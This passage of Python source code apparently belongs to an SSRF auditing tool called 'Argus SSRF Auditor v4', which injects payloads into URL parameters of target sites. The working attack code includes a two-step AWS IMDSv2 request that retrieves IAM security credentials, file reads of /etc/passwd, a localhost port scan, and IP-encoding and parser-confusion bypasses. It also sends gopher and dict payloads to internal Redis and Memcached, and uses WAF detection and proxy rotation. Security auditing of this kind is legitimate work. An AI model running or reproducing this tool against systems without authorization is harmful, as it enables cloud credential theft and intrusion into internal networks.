        for endpoint in endpoints:
            resp = _probe(session, surface, endpoint)
            time.sleep(REQUEST_SLEEP)
            if resp is None or _looks_denied(resp):
                continue
            body = _body(resp)
            new = set(_match_markers(body, METADATA_MARKERS)) - baseline.preexisting_markers
            if new:
                sev, conf, rationale = _severity_for(
                    "metadata", sorted(new), provider,
                )
                return [SSRFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="metadata", severity=sev, confidence=conf,
                    confirmed=True, payload=endpoint,
                    http_status=resp.status_code,
                    evidence=f"{provider} metadata: {rationale}",
                    details={"provider": provider, "markers": sorted(new),
                             "status": resp.status_code,
                             "body_snippet": body[:400]},
                )]

    # AWS IMDSv2 — v4 full two-step with header follow-up
    token_ep = "http://169.254.169.254/latest/api/token"
    resp = _probe(session, surface, token_ep)
    if resp and resp.status_code == 200:
        body = _body(resp).strip()
        if 20 < len(body) < 500 and re.match(r"^[A-Za-z0-9_=-]+$", body):
            # Follow-up with token header (v3 never did this)
            follow = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            if surface["location"] == "query":
                url_follow = _inject_query(surface["url"], surface["param"], follow)
                resp2 = session.get(
                    url_follow,
                    headers={"X-aws-ec2-metadata-token": body},
                )
            elif surface["location"] == "body":
                resp2 = session.request(
                    surface.get("method", "POST"), surface["url"],
                    data={surface["param"]: follow},
                    headers={"X-aws-ec2-metadata-token": body},
                )
            else:
                resp2 = None

            if resp2 is not None:
                body2 = _body(resp2)
                new = set(_match_markers(body2, CREDENTIAL_MARKERS + METADATA_MARKERS)) \
                    - baseline.preexisting_markers
                if new:
                    sev, conf, rationale = _severity_for(
                        "metadata", sorted(new), "aws_imdsv2",
                    )
                    return [SSRFinding(
                        target=surface["url"], param=surface["param"],
                        param_location=surface["location"],
                        technique="metadata", severity=sev, confidence=conf,
                        confirmed=True, payload=f"{token_ep} → {follow}",
                        http_status=resp2.status_code,
                        evidence=f"AWS IMDSv2 two-step: {rationale}",
                        details={"provider": "aws_imdsv2",
                                 "token_length": len(body),
                                 "markers": sorted(new),
                                 "body_snippet": body2[:400]},
                    )]

            # Even without follow-up success, token retrieval is HIGH
            return [SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="metadata", severity=Severity.HIGH, confidence=85,
                confirmed=True, payload=token_ep,
                http_status=resp.status_code,
                evidence="AWS IMDSv2 token endpoint returned token-like string",
                details={"token_length": len(body)},
            )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5a — FILE READ
# ═════════════════════════════════════════════════════════════════════════════

def test_file_read(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    for payload in FILE_READ_PAYLOADS:
        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        new = set(_match_markers(body, FILE_MARKERS)) - baseline.preexisting_markers
        if new:
            sev, conf, rationale = _severity_for("file_read", sorted(new))
            return [SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="file_read", severity=sev, confidence=conf,
                confirmed=True, payload=payload,
                http_status=resp.status_code,
                evidence=rationale,
                details={"path": payload, "markers": sorted(new),
                         "body_snippet": body[:400]},
            )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5b — INTERNAL SERVICES
# ═════════════════════════════════════════════════════════════════════════════

def test_internal_services(
    session: Session, surface: dict, baseline: Baseline,
    ports: list[int],
) -> list[SSRFinding]:
    findings: list[SSRFinding] = []
    scanned = 0
    for port in ports:
        if scanned >= MAX_PORT_SCAN_TARGETS:
            break
        scanned += 1
        internal_url = f"http://127.0.0.1:{port}/"
        start = time.monotonic()
        resp = _probe(session, surface, internal_url)
        elapsed = time.monotonic() - start
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue
        body = _body(resp)

        for service, banners in SERVICE_BANNERS.items():
            hits = _match_markers(body, banners)
            if hits:
                sev, conf, rationale = _severity_for("internal", hits)
                findings.append(SSRFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="internal", severity=sev, confidence=conf,
                    confirmed=True, payload=internal_url,
                    http_status=resp.status_code,
                    evidence=f"Internal {service} on :{port} — {', '.join(hits[:2])}",
                    details={"port": port, "service": service,
                             "markers": hits, "body_snippet": body[:400]},
                ))
                return findings

        if elapsed > baseline.median_time + PORT_SCAN_TIMING_DELTA:
            findings.append(SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="port_scan", severity=Severity.MEDIUM,
                confidence=55, confirmed=False, payload=internal_url,
                http_status=resp.status_code,
                evidence=f"Port :{port} delayed {elapsed:.1f}s "
                         f"(baseline {baseline.median_time:.1f}s)",
                details={"port": port, "elapsed": round(elapsed, 2),
                         "signal": "timing_filtered"},
            ))
        elif (baseline.status and resp.status_code != baseline.status
              and resp.status_code not in (0, 404, 502, 503)):
            findings.append(SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="port_scan", severity=Severity.MEDIUM,
                confidence=55, confirmed=False, payload=internal_url,
                http_status=resp.status_code,
                evidence=f"Port :{port} returned {resp.status_code} "
                         f"(baseline {baseline.status})",
                details={"port": port, "status": resp.status_code},
            ))
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — BYPASS MATRIX
# ═════════════════════════════════════════════════════════════════════════════

def _encoded_variants(canonical_url: str) -> list[tuple[str, str]]:
    parsed = urllib.parse.urlparse(canonical_url)
    host = parsed.hostname or ""
    scheme = parsed.scheme or "http"
    path = parsed.path or "/"
    port = f":{parsed.port}" if parsed.port else ""
    variants: list[tuple[str, str]] = []
    if host in IP_ENCODING_VARIANTS:
        for enc in IP_ENCODING_VARIANTS[host]:
            variants.append((f"{scheme}://{enc}{port}{path}", f"ip_encoding:{enc}"))
    for i, fn in enumerate(PARSER_CONFUSION):
        try:
            variants.append((fn(canonical_url), f"parser_confusion:{i}"))
        except Exception:
            pass
    return variants


def test_bypass(
    session: Session, surface: dict, baseline: Baseline,
    canonical_target: str, target_markers: list[str], technique_label: str,
) -> list[SSRFinding]:
    for variant, label in _encoded_variants(canonical_target):
        resp = _probe(session, surface, variant)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        new = set(_match_markers(body, target_markers)) - baseline.preexisting_markers
        if new:
            sev, conf, rationale = _severity_for(f"{technique_label}_bypass", sorted(new))
            return [SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique=f"{technique_label}_bypass",
                severity=sev, confidence=conf,
                confirmed=True, payload=variant, bypass_used=label,
                http_status=resp.status_code,
                evidence=f"Bypass '{label}' succeeded: {rationale}",
                details={"canonical_target": canonical_target,
                         "variant": variant, "bypass": label,
                         "markers": sorted(new), "body_snippet": body[:400]},
            )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — PROTOCOL ABUSE (aggressive only)
# ═════════════════════════════════════════════════════════════════════════════

def test_protocol_abuse(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    # CRLF-encoded — reaches the service, not just the port
    gopher_payloads = [
        ("gopher://127.0.0.1:6379/_INFO%0d%0a", "redis_info"),
        ("gopher://127.0.0.1:11211/_stats%0d%0a", "memcached_stats"),
        ("dict://127.0.0.1:6379/info", "dict_redis"),
    ]
    for payload, label in gopher_payloads:
        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        for service, banners in SERVICE_BANNERS.items():
            if _match_markers(body, banners):
                sev, conf, rationale = _severity_for("internal", [service])
                return [SSRFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="internal", severity=sev, confidence=conf,
                    confirmed=True, payload=payload,
                    http_status=resp.status_code,
                    evidence=f"Protocol {label} returned {service} data",
                    details={"protocol": label, "service": service,
                             "body_snippet": body[:400]},
                )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: Session, oob: OOBCapture, surface: dict,
    *,
    test_metadata: bool = True,
    test_file_read_enabled: bool = True,
    test_internal: bool = True,
    test_bypass_enabled: bool = True,
    test_protocols: bool = False,
    aggressive: bool = False,
) -> tuple[Baseline, list[SSRFinding]]:
    baseline = build_baseline(
        session, surface["url"], surface["param"], surface["location"],
        surface.get("method", "GET"),
    )
    findings: list[SSRFinding] = []

    findings.extend(test_oob(session, oob, surface, baseline))

    metadata_findings: list[SSRFinding] = []
    if test_metadata:
        metadata_findings = test_cloud_metadata(session, surface, baseline)
        findings.extend(metadata_findings)

    file_findings: list[SSRFinding] = []
    if test_file_read_enabled:
        file_findings = test_file_read(session, surface, baseline)
        findings.extend(file_findings)

    if test_internal:
        ports = SCAN_PORTS_AGGRESSIVE if aggressive else SCAN_PORTS
        findings.extend(test_internal_services(session, surface, baseline, ports))

    if test_protocols and aggressive:
        findings.extend(test_protocol_abuse(session, surface, baseline))

    if test_bypass_enabled and not metadata_findings:
        findings.extend(test_bypass(
            session, surface, baseline,
            CLOUD_METADATA["aws_imdsv1"][0], METADATA_MARKERS, "metadata",
        ))
    if test_bypass_enabled and not file_findings:
        findings.extend(test_bypass(
            session, surface, baseline,
            "file:///etc/passwd", FILE_MARKERS, "file_read",
        ))

    return baseline, findings


# ═════════════════════════════════════════════════════════════════════════════
#  EVIDENCE PRESERVATION
# ═════════════════════════════════════════════════════════════════════════════

def _save_evidence(finding: SSRFinding, evidence_dir: Path) -> None:
    try:
        evidence_dir.mkdir(parents=True, exist_ok=True)
        base = finding.finding_hash[:16]
        (evidence_dir / f"{base}_evidence.txt").write_text(
            f"finding_hash: {finding.finding_hash}\n"
            f"target: {finding.target}\n"
            f"param: {finding.param} ({finding.param_location})\n"
            f"technique: {finding.technique}\n"
            f"severity: {finding.severity.value}\n"
            f"confidence: {finding.confidence}\n"
            f"payload: {finding.payload}\n"
            f"evidence: {finding.evidence}\n"
            f"http_status: {finding.http_status}\n"
            f"details: {json.dumps(finding.details, indent=2)}\n"
        )
    except Exception as e:
        log.debug(f"evidence save failed: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[SSRFinding]) -> None:
    if not findings or not DB_AVAILABLE or DB is None:
        return
    if not _cfg("SYNC_TO_DB", True) or not _cfg("BRIDGE_ENABLED", False):
        return
    if not getattr(DB, "available", False):
        return
    method = getattr(DB, "upsert_ssrf_findings", None)
    if method is None:
        log.warning("  DB sync: db.py missing upsert_ssrf_findings()")
        return
    try:
        result = method(scan_id, [f.to_dict() for f in findings])
        if result is not None:
            log.info(f"  DB sync: {result} SSRF finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_ssrf_scan(
    urls_file: Path,
    outdir: Path,
    *,
    oob_domain: Optional[str] = None,
    use_interactsh: bool = False,
    headers: Optional[dict] = None,
    test_metadata: bool = True,
    test_file_read_enabled: bool = True,
    test_internal: bool = True,
    test_bypass_enabled: bool = True,
    test_protocols: bool = False,
    aggressive: bool = False,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _ssrf_settings()
    eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]
    eff_jitter  = settings["jitter"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])

    urls = _load_urls(urls_file)
    if len(urls) > MAX_URLS:
        log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
        urls = urls[:MAX_URLS]
    outdir.mkdir(parents=True, exist_ok=True)
    evidence_dir = outdir / "ssrf_evidence"

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    surfaces = discover_query_surfaces(urls)
    surfaces.extend(discover_body_surfaces(outdir))
    seen_s: set[tuple] = set()
    unique: list[dict] = []
    for s in surfaces:
        key = (s["url"], s["param"], s["location"])
        if key not in seen_s:
            seen_s.add(key)
            unique.append(s)
    surfaces = unique[:eff_max]

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} SSRF-prone parameter(s)")
    log.info(f"  Config : rate={eff_rate}/s  jitter={eff_jitter}s  "
             f"concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"  Mode   : {'AGGRESSIVE' if aggressive else 'safe'}")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} (rotation)")
    log.info("")

    if not surfaces:
        log.warning("  No SSRF surfaces — writing empty report")
        return _write_empty(outdir, urls_file, start, total_input=len(urls))

    oob = OOBCapture(domain=oob_domain, use_interactsh=use_interactsh)
    oob_active = oob.start()

    limiter = SharedRateLimiter(eff_rate, eff_jitter)
    session = Session(limiter, cfg_hdrs, eff_timeout, eff_proxies)

    # ── Phase 0: WAF detection (once per unique host, sample first 5) ─────
    log.info("  Phase 0 — WAF detection")
    waf_by_host: dict[str, WAFReport] = {}
    seen_hosts: set[str] = set()
    for s in surfaces[:50]:
        host = urllib.parse.urlparse(s["url"]).hostname or ""
        if not host or host in seen_hosts:
            continue
        seen_hosts.add(host)
        waf = detect_waf(session, s["url"])
        waf_by_host[host] = waf
        if waf.vendor != "unknown":
            log.info(f"    {host:<40} WAF: {waf.vendor} ({waf.confidence}%)")

    if any(w.vendor != "unknown" for w in waf_by_host.values()):
        session._backoff = 0.5
        limiter.jitter = max(eff_jitter, 1.0)

    # ── Phase 1–7: Surface testing (parallel) ───────────────────────────
    all_findings: list[SSRFinding] = []
    results: list[dict] = []

    def _process(surface: dict) -> tuple[dict, list[SSRFinding]]:
        try:
            baseline, findings = audit_surface(
                session, oob, surface,
                test_metadata=test_metadata,
                test_file_read_enabled=test_file_read_enabled,
                test_internal=test_internal,
                test_bypass_enabled=test_bypass_enabled,
                test_protocols=test_protocols,
                aggressive=aggressive,
            )
            host = urllib.parse.urlparse(surface["url"]).hostname or ""
            waf = waf_by_host.get(host, WAFReport())
            for f in findings:
                f.waf_vendor = waf.vendor
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"], "method": surface.get("method", "GET"),
                "baseline": baseline.to_dict(),
                "finding_count": len(findings),
            }, findings
        except Exception as e:
            log.debug(f"    error on {surface['url']}: {e}")
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"], "error": str(e),
            }, []

    log.info("")
    log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
    with ThreadPoolExecutor(max_workers=eff_conc) as pool:
        futures = {pool.submit(_process, s): s for s in surfaces}
        done = 0
        for fut in as_completed(futures):
            done += 1
            try:
                result, findings = fut.result()
                results.append(result)
                if findings:
                    all_findings.extend(findings)
                    top = findings[0]
                    log.info(
                        f"    [{done:>3}/{len(surfaces)}] {top.technique:<14} "
                        f"{top.severity.value:<8} {result['url'][:50]} param={result['param']}"
                    )
                elif done % 10 == 0:
                    log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
            except Exception as e:
                log.debug(f"    future error: {e}")

    # ── OOB correlation pass ────────────────────────────────────────────
    if oob_active:
        oob_wait = OOB_CORRELATION_AGGRESSIVE if aggressive else OOB_CORRELATION_WAIT
        all_findings = confirm_oob_batch(oob, all_findings, oob_wait)
    oob.stop()

    # ── Chains ───────────────────────────────────────────────────────────
    log.info("")
    log.info("  Chain aggregation")
    chains = build_chains(all_findings)
    log.info(f"    {len(chains)} chain(s)")

    # ── Dedupe ───────────────────────────────────────────────────────────
    seen_f: set[tuple] = set()
    deduped: list[SSRFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique)
        if key not in seen_f:
            seen_f.add(key)
            f.auth_enabled = auth_on
            if not f.first_seen:
                f.first_seen = _db_now()
            deduped.append(f)
    deduped.sort(key=lambda f: (
        -f.severity.rank, 0 if f.confirmed else 1, -f.confidence, f.target,
    ))

    # ── Evidence + reports ──────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_technique: dict[str, int] = {}
    confirmed_list = [f for f in deduped if f.confirmed]
    oob_findings = [f for f in deduped if f.technique == "oob"]
    oob_hits = [f for f in oob_findings if f.oob_confirmed]

    for f in deduped:
        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.confirmed:
            _save_evidence(f, evidence_dir)

    json_path = outdir / "ssrf_findings.json"
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "aggressive": aggressive,
        "config": {
            "oob_domain": oob_domain, "interactsh": use_interactsh,
            "rate_limit": eff_rate, "jitter": eff_jitter,
            "concurrency": eff_conc, "timeout": eff_timeout,
            "proxies": len(eff_proxies),
            "test_metadata": test_metadata,
            "test_file_read": test_file_read_enabled,
            "test_internal": test_internal,
            "test_bypass": test_bypass_enabled,
            "test_protocols": test_protocols,
        },
        "totals": {
            "urls_input":      len(urls),
            "surfaces_tested": len(surfaces),
            "total_findings":  len(deduped),
            "confirmed":       len(confirmed_list),
            "oob_findings":    len(oob_findings),
            "oob_confirmed":   len(oob_hits),
            "critical":        by_sev["CRITICAL"],
            "high":            by_sev["HIGH"],
            "medium":          by_sev["MEDIUM"],
            "low":             by_sev["LOW"],
            "info":            by_sev["INFO"],
        },
        "summary": {
            "by_severity":  by_sev,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
        },
        "results":  results,
        "findings": [f.to_dict() for f in deduped],
    }
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # Confirmed-only report
    confirmed_high = [f for f in deduped if f.severity.rank >= Severity.HIGH.rank]
    (outdir / "ssrf_confirmed.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "input_file": str(urls_file),
            "totals": {
                "confirmed": len(confirmed_high),
                "critical":  sum(1 for f in confirmed_high if f.severity == Severity.CRITICAL),
                "high":      sum(1 for f in confirmed_high if f.severity == Severity.HIGH),
                "by_chain":  {
                    cid: sum(1 for f in confirmed_high if cid in f.chain_ids)
                    for cid in {x for f in confirmed_high for x in f.chain_ids}
                },
            },
            "findings": [f.to_dict() for f in confirmed_high],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Chains
    (outdir / "ssrf_chains.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "chains": [c.to_dict() for c in chains],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Flat files
    (outdir / "ssrf_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.severity.value}\t{f.confidence}\t"
            f"{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )
    (outdir / "ssrf_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.payload[:150]}"
            for f in confirmed_list
        ) + ("\n" if confirmed_list else "")
    )
    (outdir / "ssrf_oob.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.oob_token}\t{f.severity.value}\t"
            f"{'CONFIRMED' if f.oob_confirmed else 'pending'}"
            for f in oob_findings
        ) + ("\n" if oob_findings else "")
    )

    # DB sync
    if scan_id is not None:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)

    # Console summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    ssrf_findings.json           {len(deduped):>5} finding(s)")
    log.info(f"    ssrf_confirmed.json          {len(confirmed_high):>5} confirmed (HIGH+)")
    log.info(f"    ssrf_chains.json             {len(chains):>5} chain(s)")
    log.info(f"    ssrf_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    ssrf_confirmed.txt           {len(confirmed_list):>5} confirmed")
    log.info(f"    ssrf_oob.txt                 {len(oob_findings):>5} OOB finding(s)")
    if confirmed_high:
        log.info(f"    ssrf_evidence/               {len(confirmed_list):>5} evidence pair(s)")
    log.info("")
    log.info(f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
             f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}")
    log.info(f"  Confirmed: {len(confirmed_list)}/{len(deduped)}  ·  OOB hits: {len(oob_hits)}")
    if chains:
        log.info("  Chains   : " + " · ".join(
            f"{c.chain_id}({c.severity.value})" for c in chains
        ))
    if confirmed_high:
        log.info("")
        log.info("  Confirmed SSRF findings:")
        for f in confirmed_high[:12]:
            tag = f" [{','.join(f.chain_ids)}]" if f.chain_ids else ""
            log.info(f"    [{f.severity.value:<8}] {f.technique:<14} "
                     f"{f.param:<15} {f.target[:55]}{tag}")
    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": False, "aggressive": False, "config": {},
        "totals": {
            "urls_input": total_input, "surfaces_tested": 0,
            "total_findings": 0, "confirmed": 0, "oob_findings": 0,
            "oob_confirmed": 0, "critical": 0, "high": 0,
            "medium": 0, "low": 0, "info": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}},
        "results": [], "findings": [],
    }
    path = outdir / "ssrf_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    (outdir / "ssrf_confirmed.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(input_file),
        "totals": {"confirmed": 0, "critical": 0, "high": 0, "by_chain": {}},
        "findings": [],
    }, indent=2) + "\n")
    (outdir / "ssrf_chains.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(), "chains": [],
    }, indent=2) + "\n")
    for n in ("ssrf_candidates.txt", "ssrf_confirmed.txt", "ssrf_oob.txt"):
        (outdir / n).write_text("")
    (outdir / "ssrf_evidence").mkdir(exist_ok=True)
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(message)s",
                        handlers=[logging.StreamHandler(sys.stdout)])
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_ssrf.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"

    parser = argparse.ArgumentParser(description="Argus SSRF Auditor v4")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=base / "output")
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--proxies", default=None)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--oob-domain", help="OOB domain (manual)")
    parser.add_argument("--interactsh", action="store_true")
    parser.add_argument("--no-metadata", action="store_true")
    parser.add_argument("--no-file-read", action="store_true")
    parser.add_argument("--no-internal", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--protocols", action="store_true",
                        help="Enable gopher/dict (aggressive only)")
    parser.add_argument("--aggressive", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=None)
    args = parser.parse_args()

    hdrs = {"Cookie": args.cookie} if args.cookie else None
    proxies = args.proxies.split(",") if args.proxies else None

    try:
        run_ssrf_scan(
            args.input, args.output,
            oob_domain=args.oob_domain,
            use_interactsh=args.interactsh,
            headers=hdrs,
            test_metadata=not args.no_metadata,
            test_file_read_enabled=not args.no_file_read,
            test_internal=not args.no_internal,
            test_bypass_enabled=not args.no_bypass,
            test_protocols=args.protocols,
            aggressive=args.aggressive,
            max_surfaces=args.max_surfaces,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            timeout=args.timeout,
            proxies=proxies,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        import traceback; log.debug(traceback.format_exc()); sys.exit(1)
